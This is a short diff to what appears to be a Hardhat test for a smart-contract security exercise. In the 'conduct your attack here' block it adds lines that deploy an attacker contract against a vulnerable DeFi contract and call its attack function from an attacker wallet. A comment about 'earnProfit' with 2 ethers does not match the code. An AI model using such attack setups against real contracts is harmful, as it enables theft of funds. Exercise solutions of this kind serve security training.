@@ -42,6 +42,11 @@ describe(NAME, function () {
 
         // prettier-ignore
         it("conduct your attack here", async function () {
+            const VulnerableDeFiAttackerFactory = await ethers.getContractFactory("VulnerableDeFiContractAttacker");
+            const vulnerableDeFiAttackerContract = await VulnerableDeFiAttackerFactory.deploy(readOnlyContract.address, vulnerableDeFiContract.address, { value: ethers.utils.parseEther("1") });
+    
+            // Call the earnProfit function with a value of 2 ethers
+            await vulnerableDeFiAttackerContract.connect(attackerWallet).attack();
     
     });
 
